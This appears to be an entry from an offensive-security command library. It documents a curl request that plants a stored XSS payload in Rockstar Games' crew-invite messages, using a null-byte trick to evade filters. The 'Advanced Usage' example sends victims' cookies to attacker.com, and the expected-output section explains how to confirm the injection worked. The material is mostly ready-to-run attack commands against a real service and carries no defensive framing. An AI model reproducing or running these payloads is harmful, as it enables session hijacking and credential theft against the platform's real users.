---
id: cmd-uuid-456
data: >-
  curl -X POST 'https://platform.rockstargames.com/crew/invite' -H
  'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json' -d
  '{"message": "Hi join crew\\x00<script>alert(\\"XSS\\")</script>",
  "target_user_id": 12345}'
tags:
  - xss
  - injection
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:09.197Z'
verified: false
validated: true
submitted: true
---
# modify-crew-invite-request

## Command

```bash
curl -X POST 'https://platform.rockstargames.com/crew/invite' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"message": "Hi join crew\\x00<script>alert(\\"XSS\\")</script>", "target_user_id": 12345}'
```

## Description

This command simulates sending a modified Crew Invite request to Rockstar Games' platform, injecting a stored XSS payload via control characters in the message field to bypass filters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://platform.rockstargames.com/crew/invite` | Target endpoint URL | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Authentication header with session token | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `-d '{...}'` | JSON payload with injected message | Yes |
| `"target_user_id": 12345` | ID of target user for invite | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://platform.rockstargames.com/crew/invite' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"message": "Test invite", "target_user_id": 12345}'
```

### Advanced Usage

```bash
curl -X POST 'https://platform.rockstargames.com/crew/invite' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"message": "Normal\\x00<script>document.location=\\"http://attacker.com/steal?cookie=\\"+document.cookie</script>", "target_user_id": 12345}'
```

## Expected Output

HTTP 200 OK with JSON response containing invite ID or success message, e.g., {"invite_id": "abc123", "status": "sent"}. No errors indicate successful injection; verify by accessing the invite.

## Related

- [[Related Procedure|procedures/Inject-Malicious-Payload-into-Crew-Invite-Message]]
